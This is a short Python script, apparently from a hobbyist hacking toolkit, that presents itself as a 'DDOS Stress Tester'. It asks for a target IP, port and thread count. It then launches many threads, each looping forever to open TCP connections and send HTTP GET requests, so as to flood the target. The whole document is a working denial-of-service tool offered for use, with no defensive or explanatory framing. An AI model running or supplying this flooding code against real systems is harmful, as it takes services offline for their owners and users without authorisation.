# CREATED BY: RAMIZ UDDIN
import os, time

def tool_header(name):
    os.system("clear")
    print("\033[1;36m" + "="*45)
    print(f"      {name.upper()}")
    print("      CREATED BY: RAMIZ UDDIN")
    print("="*45 + "\033[0m")

# CREATED BY: RAMIZ UDDIN
import socket, threading
def attack(target, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.close()
        except: pass
def run():
    while True:
        print("\033[1;32m[*] ", end=""); print("\n\033[1;31m[*] DDOS Stress Tester\033[0m")
        target = input("\nEnter Target IP (or '0' to exit): ")
        if target == '0': break
        port = int(input("Port (80): ") or 80)
        threads = int(input("Threads (100): ") or 100)
        print("\033[1;32m[*] ", end=""); print(f"[*] Attacking {target}... (Press Ctrl+C to stop)")
        try:
            for i in range(threads): threading.Thread(target=attack, args=(target, port)).start()
        except KeyboardInterrupt: print("\033[1;32m[*] ", end=""); print("\n[!] Attack Stopped.")
if __name__ == "__main__": run()
